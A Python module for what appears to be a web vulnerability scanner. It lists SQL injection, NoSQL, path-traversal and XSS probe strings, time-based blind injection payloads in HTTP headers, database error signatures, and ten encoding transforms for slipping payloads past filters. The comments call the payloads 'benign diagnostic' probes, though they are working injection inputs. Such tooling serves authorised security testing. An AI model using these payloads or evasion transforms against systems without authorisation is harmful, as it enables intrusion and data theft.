from __future__ import annotations

import base64
import random
from typing import Callable, Dict, List

# Benign diagnostic SQL and NoSQL probe templates
SQL_DIAGNOSTIC_PAYLOADS: List[str] = [
    "' OR 1=1--",
    "\" OR \"1\"=\"1\" #",
    "') OR ('1'='1'--",
    "' UNION SELECT NULL,NULL,CONCAT(0x71,VERSION(),0x71)--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    '{"$gt": ""}',
    "admin'--",
    "../../../../etc/passwd",
    "<svg/onload=ghost_reflection_marker_2026>",
]

# Database error reflection signatures
DATABASE_ERROR_SIGNATURES: List[str] = [
    "sql syntax",
    "mysql_fetch",
    "native client",
    "unclosed quotation mark",
    "postgresql query",
    "mongodb",
    "ora-00933",
    "sqlite3.operationalerror",
    "syntax error near",
    "you have an error in your sql syntax",
]

# Header diagnostic probes (destructive legacy DDL '; DROP TABLE users--' is replaced with non-destructive diagnostic)
HEADER_DIAGNOSTIC_PROBES: Dict[str, str] = {
    "User-Agent": "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "X-Forwarded-For": "127.0.0.1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "Referer": "' OR (SELECT 1)=1--",  # Safe diagnostic replacement for legacy drop table
}

# 10 payload transformations matching Ghost Scanner v75 (M-00 to M-09)
TRANSFORMS: Dict[str, Callable[[str], str]] = {
    "M-00": lambda p: p,
    "M-01": lambda p: p.replace(" ", "/**/"),
    "M-02": lambda p: "".join(f"%{ord(c):02x}" for c in p),
    "M-03": lambda p: "".join(f"%%{ord(c):02x}" for c in p),
    "M-04": lambda p: base64.b64encode(p.encode("utf-8")).decode("ascii"),
    "M-05": lambda p: p.replace("'", "%27").replace(" ", "+"),
    "M-06": lambda p: f"/*!50000{p}*/",
    "M-07": lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    "M-08": lambda p: p.replace("OR", "||").replace("AND", "&&"),
    "M-09": lambda p: f"admin'-- " if "1=1" in p else p,
}


def apply_mutation(payload: str, transform_id: str = "M-00") -> str:
    """Applies a specific mutation transform to a diagnostic payload."""
    func = TRANSFORMS.get(transform_id, TRANSFORMS["M-00"])
    return func(payload)


def get_random_mutated_payload(payload: str, seed: int = 310) -> str:
    """Deterministically picks one of the 10 transformations using the configured random seed."""
    rng = random.Random(seed)
    chosen_id = rng.choice(list(TRANSFORMS.keys()))
    return apply_mutation(payload, chosen_id)
